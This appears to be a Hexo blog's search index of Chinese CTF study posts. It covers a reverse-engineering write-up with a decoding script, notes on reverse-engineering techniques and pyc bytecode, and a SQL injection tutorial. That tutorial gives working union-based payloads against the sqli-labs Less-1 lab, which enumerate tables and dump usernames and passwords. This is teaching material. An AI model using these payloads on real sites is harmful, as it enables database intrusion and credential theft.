<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>NSSCTF encode</title>
    <url>/2022/12/13/NSSCTF-encode/</url>
    <content><![CDATA[<p>在NSS中的一些做题记录</p>
<h1 id="BJDCTF-2020-encode"><a href="#BJDCTF-2020-encode" class="headerlink" title="[BJDCTF 2020]encode"></a>[BJDCTF 2020]encode</h1><p>查壳，upx简单脱壳</p>
<p>主要逻辑：</p>
<p>_posts&#x2F;post_name&#x2F;image-20221213085151395.png</p>
<img src="/2022/12/13/NSSCTF-encode/image-20221213085151395.png" class title="This is an image">

<p>跟进两个加密函数，可以发现一个是变表的base64，一个是RC4加密</p>
<p>_posts&#x2F;post_name&#x2F;image-20221213085441778.png</p>
<img src="/2022/12/13/NSSCTF-encode/image-20221213085441778.png" class title="This is an image">

<p>_posts&#x2F;post_name&#x2F;image-20221213085537087.png</p>
<img src="/2022/12/13/NSSCTF-encode/image-20221213085537087.png" class title="This is an image">

<p>所以整个思路就是：</p>
<ul>
<li>对输入的flag进行变表的base64加密</li>
<li>进行一个异或操作</li>
<li>进行RC4加密（密钥为Flag{This_a_Flag}）</li>
<li>最后进行一个验证</li>
</ul>
<p>RC4在线解密：<a href="http://www.hiencode.com/rc4.html">http://www.hiencode.com/rc4.html</a></p>
<p>解密后明文：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">23152553081a5938126a3931275b0b1313085c330b356101511f105c</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1=<span class="string">&quot;23152553081a5938126a3931275b0b1313085c330b356101511f105c&quot;</span></span><br><span class="line">str2=<span class="string">&quot;Flag&#123;This_a_Flag&#125;&quot;</span></span><br><span class="line"><span class="built_in">str</span>=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(str1),<span class="number">2</span>):</span><br><span class="line">    <span class="built_in">str</span>.append(<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span>+str1[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line"><span class="comment">#这里由于原来数据都是16进制的，所以进行了一个两位一组分组</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">base64_encode=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(<span class="built_in">str</span>)):</span><br><span class="line">    base64_encode+=<span class="built_in">chr</span>(<span class="built_in">str</span>[i]^<span class="built_in">ord</span>(str2[i%<span class="built_in">len</span>(str2)]))</span><br><span class="line"><span class="built_in">print</span>(base64_encode)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">str1 = <span class="string">&quot;eyD4sN1Qa5Xna7jtnN0RlN5i8lO=&quot;</span>   <span class="comment">#str1是要解密的代码</span></span><br><span class="line">string1 = <span class="string">&quot;0123456789+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>   <span class="comment">#string1是改过之后的base64表</span></span><br><span class="line">string2 = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(str1.translate(<span class="built_in">str</span>.maketrans(string1,string2))))</span><br><span class="line"><span class="comment">#BJD&#123;0v0_Y0u_g07_1T!&#125;</span></span><br></pre></td></tr></table></figure>

<p>参考博客：<a href="https://blog.csdn.net/qq_39542714/article/details/106834866">https://blog.csdn.net/qq_39542714/article/details/106834866</a></p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2022/09/25/hello-world/</url>
    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
]]></content>
  </entry>
  <entry>
    <title>re求学之路</title>
    <url>/2022/12/12/re%E6%B1%82%E5%AD%A6%E4%B9%8B%E8%B7%AF/</url>
    <content><![CDATA[<p>简单介绍，其实只是想试试新搭建的博客能不能用</p>
<p>Reverse即软件逆向工程，是对编译成型的二进制程序进行代码、逻辑和功能分析的过程。在CTF中主要</p>
<p>考察软件静态分析和动态调试能力，常见的逆向目标为Windows、Linux平台下x86、x64二进制可执行</p>
<p>程序。</p>
<p><strong>能力要求</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">熟悉如操作系统，汇编语言，加解密等相关知识。</span><br><span class="line"></span><br><span class="line">具有丰富的多种高级语言的编程经验。</span><br><span class="line"></span><br><span class="line">熟悉多种编译器的编译原理。</span><br><span class="line"></span><br><span class="line">较强的程序理解和逆向分析能力。</span><br></pre></td></tr></table></figure>

<p><strong>逆向分析的主要方法</strong></p>
<p><strong>静态分析法</strong></p>
<p>静态分析法是在不执行代码文件的情况下，对代码进行静态分析的一种方法，主要观察代码文件的外部特性，包括文件类型分析和静态反汇编、反编译。通常使用反汇编工具查看内部代码，分析代码结构。</p>
<p><strong>动态分析法</strong></p>
<p>动态分析法是在程序文件的执行过程中对代码进行动态分析的一种方法，其通过调试来分析代码、获取内存的状态等，目的在于定位关键代码后，在程序运行的过程中，借由输出信息（寄存器，内存变化，程序输出）等来验证自己的推断或是理解程序功能。通常使用调试器来分析程序的内部结构和实现原理。</p>
<p><strong>调试工具</strong></p>
<p>调试工具有以下两个重要功能：</p>
<p>\1. 断点设置</p>
<p>允许用户选在程序中任意位置的某行代码，一旦程序运行到这一行，将知识调试工具停止运</p>
<p>行程序，并显示程序的当前状态。</p>
<p>\2. 代码跟踪（单步调试）</p>
<p>允许用户在程序运行时跟踪他的执行，程序每执行一条汇编代码后都会暂停，允许用户观察</p>
<p>甚至改变程序的状态。</p>
<p>调试工具主要根据操作系统来选择</p>
<p>Windows——<strong>Ollydbg</strong></p>
<p>Ollydbg是Windows下一款具有可视化界面的用户态调试工具，推荐从吾爱破解论坛上下载</p>
<p>吾爱破解专用版Ollydbg，这个版本有对抗反调试的功能。</p>
<p>Linux——<strong>GDB</strong></p>
<p>GDB是一款功能强大的程序调试工具，是动态调试必不可少的工具，可以很方便的查看堆中</p>
<p>链表的状态，各个地址的内容。GDB拥有多个插件（peda、pwndbg、gef等）这些插件提供</p>
<p>了一些额外的命令，在可视化和功能上都进行了扩展。推荐安装一个插件即可，多个插件的切换与系统环境变量相关，自行百度。</p>
<p><strong>Trace****类工具</strong></p>
<p>Trace类工具通过一定的方式监控并记录程序的运行，然后使分析者在记录的信息中得到程序的一些动态</p>
<p>信息。</p>
<p>Strace</p>
<p>Strace使Linux下一个用来跟踪系统调用的工具，可以监控用户空间进程和内核的交互，比如</p>
<p>系统调用、信号传递、进程状态变更等。</p>
<p><strong>Qira</strong></p>
<p>Qira是一个强大的Trace类工具，可以将程序整个执行流全部记录下来，然后给予用户<strong>回溯</strong>、</p>
<p>查看命中断点的所有指令（即交叉引用）等。</p>
<p>Qira的安装比较难，多多百度&#x2F;谷歌。</p>
<p><strong>常规逆向分析流程</strong></p>
<p><strong>1****、收集信息</strong></p>
<p>使用strings&#x2F;file&#x2F;binwalk&#x2F;IDA等静态分析工具收集信息，并根据这些静态信息进行google&#x2F;github搜索</p>
<p><strong>2****、干扰分析技术</strong></p>
<p>程序为了保护代码，通常会使用一系列技术来干扰逆向分析，这里会介绍一些常见的干扰分析技术。</p>
<p>花指令</p>
<p>花指令是代码保护中一种简单的技巧，原理是在原始代码中插入一段无用的或者能够干扰反</p>
<p>汇编引擎的代码。花指令主要影响静态分析，在IDA中表现为一些指令无法识别，导致某些函</p>
<p>数未能识别，从而无法对这些函数进行反编译。</p>
<p>要破解花指令，可以在IDA中手动将花指令patch成nop空指令，从而去除花指令。如果程序</p>
<p>中花指令较多，可以通过分析花指令的特定模式，编写IDAPython脚本对花指令进行自动化</p>
<p>搜索和patch。</p>
<p>反调试</p>
<p>反调试技术是指程序在运行时会检测其是否处于被调试状态，如果发现其正在被调试，就无</p>
<p>法正常运行。</p>
<p>Windows下通过Ollydbg的StringOD插件可以过滤掉大多数的反调试方法。</p>
<p>Liunx下主要利用ptrace系统调用、proc文件系统检测和父进程检测来检测自身是否正在被调</p>
<p>试，针对这些反调试方法，常用的方法就是定位到反调试的代码，然后对程序进行patch，在</p>
<p>不影响程序正常功能的情况下，跳过对调试器的检测代码。</p>
<p>加壳</p>
<p>加壳是指在二进制的程序中植入一段代码。在运行的时候优先取得程序的控制权，这段代码</p>
<p>会在执行的过程中对原始指令进行解密还原，之后再将控制权交还给原始代码，执行原来的</p>
<p>代码。</p>
<p>被加过壳的程序，其真正的代码是加密存放在二进制文件中的，只有在执行时才从内存中解</p>
<p>密还原出来，因此没法对加了壳的程序直接进行静态分析。</p>
<p>在CTF比赛中出现的带壳程序通常为已知的壳，大部分都可以通过使用专用工具或者脚本的</p>
<p>脱壳。可以使用PEiD工具查询该带壳程序用的什么壳，再用对应工具或脚本脱壳。</p>
<p>控制流混淆</p>
<p>对于控制流混淆的程序，没有办法直接进行静态分析，也无法进行反编译，而调试器调试也</p>
<p>会陷入控制流的跳转混乱中。</p>
<p>对于控制流混淆的程序，通常通过Trace工具记录下程序运行的所有指令，然后再运行这些指</p>
<p>令的基础上进行数据流分析。</p>
<p>双进程保护（Debug Blocker）</p>
<p>双进程保护是一种在调试模式下运行自身程序的方法。这种保护通常存在两个进程，由父进</p>
<p>程调试子进程。实际功能的代码运行在子进程中，但是因为子进程已经处于调试状态，无法</p>
<p>再使用其他调试器进行附加操作。同时父进程能够控制子进程，通过处理子进程的异常，可</p>
<p>以控制子进程正常运行。</p>
<p>双进程保护技术的难点在于，真正的功能运行在子进程中，若要调试子进程，就需要断开其</p>
<p>与父进程之间的链接，但是一旦断开，没有父进程处理子进程的异常，会导致子进程无法正</p>
<p>常运行。</p>
<p>对于双进程保护的程序，其父进程通常功能单一，因此先针对父进程，了解其处理子进程异</p>
<p>常的逻辑，然后调试子程序，使其脱离父进程之后仍能正常运行，最后在对子进程进行调试</p>
<p>分析。</p>
<p><strong>3****、关键代码定位</strong></p>
<p>在一个可执行程序中，汇编代码数量庞大，所以要能够定位出真正需要分析的关键代码，只有找到关键</p>
<p>代码之后，才能对关键代码采用的算法进行分析，理清程序功能，最后针对程序功能，写出对应脚本，</p>
<p>解出flag。</p>
<p>这里给出3个常用的关键代码定位法</p>
<p>API断点法</p>
<p>例如：在获取文本输入时，窗口类程序获取文本的方式主要是通过GetWindowsText和</p>
<p>GetDlgItemText两个API来获取。在输出结果时，会弹出对话框，这时调用的API通常为</p>
<p>MessageBox。在这些API函数中下断点，在调试工具中断下来后，通过栈回溯即可定位到关</p>
<p>键代码。</p>
<p>字符串检索法</p>
<p>在IDA中</p>
<p>打开Strings子窗口，通过Ctrl+F输入想要查找的字符串。</p>
<p>在Ollydbg中</p>
<p>通过Alt+E，可以查看可执行模块，找到主模块，点击右键，选择中文搜索引擎，根据需</p>
<p>要搜索ASCII或者UNICODE。</p>
<p>辅助工具定位法</p>
<p>针对特定语言或编译器生成的程序，可以用一些辅助工具帮助快速定位案件处理程序的地</p>
<p>址。</p>
<p>如：针对MFC程序的xspy，针对Delphi程序的Dede。</p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>浅谈python逆向</title>
    <url>/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h2 id="pyc文件结构解析"><a href="#pyc文件结构解析" class="headerlink" title="pyc文件结构解析"></a>pyc文件结构解析</h2><p>pyc文件是python在编译过程中出现的主要中间过程文件，pyc文件是二进制的，可以由python虚拟机直接执行的程序，要注意的是pyc的内容和python版本是密切相关的</p>
<p>Python代码的编译结果就是PyCodeObject对象。PyCodeObject对象可以由虚拟机加载后直接运行，而pyc文件就是PyCodeObject对象在硬盘上的保存形式</p>
<p>pyc文件结构主要包括两部分：pyc文件头部表示和PyCodeObject对象部分</p>
<p>完整的pyc文件结构：</p>
<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221015182903419.png" class title="This is an image">

<p>我们可以通过运行实例，来理解pyc文件</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#源码：</span></span><br><span class="line">s=<span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    a=<span class="number">3</span></span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">func()</span><br></pre></td></tr></table></figure>

<p>执行一下指令生成pyc文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python2 -m py_compile test.py</span><br></pre></td></tr></table></figure>

<p>用二进制打开生成的test.pyc文件</p>
<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221015212226821.png" class title="This is an image">

<p>前4个字节：03f3 0d0a  表示python版本</p>
<p>第5-8个字节：9eb2 4a63  表示pyc文件修改时间</p>
<h2 id="pyc字节码是什么"><a href="#pyc字节码是什么" class="headerlink" title="pyc字节码是什么"></a>pyc字节码是什么</h2><p>Python实际上将源代码编译为一组虚拟机指令，Python的解释器就是该虚拟机的一个具体实现。这种跑在虚拟机内部的中间格式被称为“字节码”。</p>
<p><strong>补</strong>：因为python很吃环境，所以我们可以使用anaconda进行环境的切换</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">conda create --name my_test python=3.7 #创建环境</span><br><span class="line">conda activate 环境名  #切换环境</span><br><span class="line">conda info --env #查看所创建的环境列表</span><br></pre></td></tr></table></figure>

<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221014203637627.png" class title="This is an image">

<h2 id="如何使用anaconda读取pyc文件的字节码？"><a href="#如何使用anaconda读取pyc文件的字节码？" class="headerlink" title="如何使用anaconda读取pyc文件的字节码？"></a>如何使用anaconda读取pyc文件的字节码？</h2><p>注意对应的环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import dis,marshal    #导入两个库</span><br><span class="line">f=open(&#x27;tmp.pyc&#x27;,&#x27;rb&#x27;).read()  #以二进制的形式读取</span><br><span class="line">code=marshal.loads(f[16:])  #装载，注意看py2还是py3</span><br><span class="line">code</span><br><span class="line">dis.dis(code)</span><br></pre></td></tr></table></figure>

<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221014204406181.png" class title="This is an image">

<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221014205000618.png" class title="This is an image">

<p><strong>补：</strong></p>
<ul>
<li>python2的magic number为前8个字节，python3的magic number为前16个字节</li>
<li>python2是三个字节为一个指令，python3是两个字节为一个指令</li>
</ul>
<p>所以一般来说我们会遇到几种类型题：</p>
<p>1.直接给出txt文件，让你翻译字节码</p>
<ul>
<li>读py字节码</li>
<li>根据opcode文件查询意思</li>
</ul>
<p>2.给出pyinstaller打包的exe文件</p>
<ul>
<li>pyinstxtractor工具解包</li>
<li>uncompyle6反编译</li>
</ul>
<p>3.给出pyc文件，加花或者没加花，后面会详细介绍加花的题目</p>
<h3 id="这里先给大家看一个最简单的例子："><a href="#这里先给大家看一个最简单的例子：" class="headerlink" title="这里先给大家看一个最简单的例子："></a>这里先给大家看一个最简单的例子：</h3><img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221227162243135.png" class title="This is an image">

<p>这里直接给了一个pyc文件，但无法进行反编译。我们仔细观察可以发现这个pyc文件缺少了时间戳，所以我们补上四字节就可以正常反编译了。</p>
<img src="/2022/12/27/%E6%B5%85%E8%B0%88python%E9%80%86%E5%90%91/image-20221227163112058.png" class title="This is an image">

<p>无法反编译的情况，也有可能是因为加了花，我们后续再继续介绍。</p>
]]></content>
      <categories>
        <category>re</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>sql注入</title>
    <url>/2022/12/28/sql%E6%B3%A8%E5%85%A5/</url>
    <content><![CDATA[<h1 id="SQL注入漏洞形成的原因："><a href="#SQL注入漏洞形成的原因：" class="headerlink" title="SQL注入漏洞形成的原因："></a>SQL注入漏洞形成的原因：</h1><h2 id="动态字符串构建引起"><a href="#动态字符串构建引起" class="headerlink" title="动态字符串构建引起"></a>动态字符串构建引起</h2><ul>
<li>不正确的处理转义字符（宽字节注入）</li>
<li>不正确的处理错误（报错泄露信息）</li>
<li>不正确的处理联合查询</li>
<li>不正确的处理多次提交（二次注入）</li>
</ul>
<h2 id="后台存在的问题"><a href="#后台存在的问题" class="headerlink" title="后台存在的问题"></a>后台存在的问题</h2><ul>
<li>后台无过滤或者编码用户数据</li>
<li>数据库可以拼接用户传递的恶意代码</li>
</ul>
<h2 id="错误处理不当"><a href="#错误处理不当" class="headerlink" title="错误处理不当"></a>错误处理不当</h2><ul>
<li>详细的内部错误消息显示给用户或攻击者</li>
<li>错误信息可以直接给攻击者提供下一步攻击帮助</li>
</ul>
<h2 id="不安全的数据库配置"><a href="#不安全的数据库配置" class="headerlink" title="不安全的数据库配置"></a>不安全的数据库配置</h2><h1 id="寻找SQL注入点"><a href="#寻找SQL注入点" class="headerlink" title="寻找SQL注入点"></a>寻找SQL注入点</h1><h2 id="GET方法"><a href="#GET方法" class="headerlink" title="GET方法"></a>GET方法</h2><p>一种请求服务器的HTTP方法，使用该方法时，信息包含在URL中</p>
<p><strong>格式：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?text=value1&amp;cat=value2&amp;num=value3..</span><br></pre></td></tr></table></figure>

<h2 id="POST方法"><a href="#POST方法" class="headerlink" title="POST方法"></a>POST方法</h2><p>一种用于向Web服务器发送信息的HTTP方法，数据信息无法在URL中看到，可以发送字节大的数据</p>
<h1 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h1><p><strong>按数据类型</strong>：</p>
<ul>
<li>数字型</li>
<li>字符型</li>
</ul>
<p><strong>按返回结果：</strong></p>
<ul>
<li>报错型</li>
<li>盲注型</li>
</ul>
<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>

<p><strong>提交</strong> <strong>1 and 1&#x3D;1</strong></p>
<p>语句变成<strong>SELECT * FROM users WHERE id&#x3D;1 and 1&#x3D;1 limit 0,1</strong></p>
<p>这时语句前值后值都为<strong>真</strong>，and以后也为<strong>真</strong>，返回查询到的数据。</p>
<p>执行了攻击者额外的SQL查询语句，导致SQL注入漏洞猜列名。</p>
<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>

<p><strong>提交</strong> 1’ and ‘1’&#x3D;‘1</p>
<p>语句变成<strong>SELECT * FROM users WHERE id&#x3D;‘1’ and ‘1’&#x3D;‘1’ limit 0,1</strong></p>
<p>这时语句前值后值都为真，and以后也为真**，返回查询到的数据</p>
<p>执行了攻击者额外的SQL查询语句，导致SQL注入漏洞猜列名</p>
<h1 id="sqli-labs"><a href="#sqli-labs" class="headerlink" title="sqli-labs"></a>sqli-labs</h1><h2 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h2><p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>,<span class="string">&#x27;ID:&#x27;</span>.<span class="variable">$id</span>.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">	&#123;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;font size=&#x27;5&#x27; color= &#x27;#99FF00&#x27;&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">  	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot;&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">&quot;Please input the ID as parameter with numeric value&quot;</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>?id&#x3D;1</p>
<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229155538976.png" class title="This is an image">

<p>?id&#x3D;2</p>
<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229155733577.png" class title="This is an image">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;  报错</span><br><span class="line">?id=1&#x27; and 1=1 报错</span><br><span class="line">?id=1&#x27; and 1=1 --+ 正常</span><br></pre></td></tr></table></figure>

<p>判断为字符型注入</p>
<p><strong>联合注入：</strong></p>
<p>1.首先要知道表格有几列，如果报错就是超过列数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1&#x27;order by 3 --+</span><br></pre></td></tr></table></figure>

<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229161209319.png" class title="This is an image">

<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229161327329.png" class title="This is an image">

<p>说明表格有3列</p>
<p>2.爆出显示位，就是看看表格中哪些列是显示在页面中的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3--+</span><br></pre></td></tr></table></figure>



<p>3.获取当前的数据名和版本号</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>

<p>可以知道，当前数据看是security，版本是5.7.26</p>
<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229161822154.png" class title="This is an image">

<p>4.爆表名</p>
<p>爆表，information_schema.tables表示该数据库下的tables表，点表示下一级。where后面是条件，group_concat()是将查询到结果连接起来。如果不用group_concat查询到的只有user。该语句的意思是查询information_schema数据库下的tables表里面且table_schema字段内容是security的所有table_name的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;--+</span><br></pre></td></tr></table></figure>

<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229162006151.png" class title="This is an image">

<p>5.爆字段名</p>
<p>通过上面的查询我们知道当前数据库有四个表，根据表名我们猜测可能用户的账户和密码在users表中。所以我们要想办法得到该表下的字段名和内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;--+</span><br></pre></td></tr></table></figure>

<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229162115279.png" class title="This is an image">

<p>6.通过上述操作可以得到两个敏感字段就是username和password,接下来我们就要得到该字段对应的内容。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username , password) from users--+</span><br></pre></td></tr></table></figure>

<img src="/2022/12/28/sql%E6%B3%A8%E5%85%A5/image-20221229162232278.png" class title="This is an image">
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
</search>
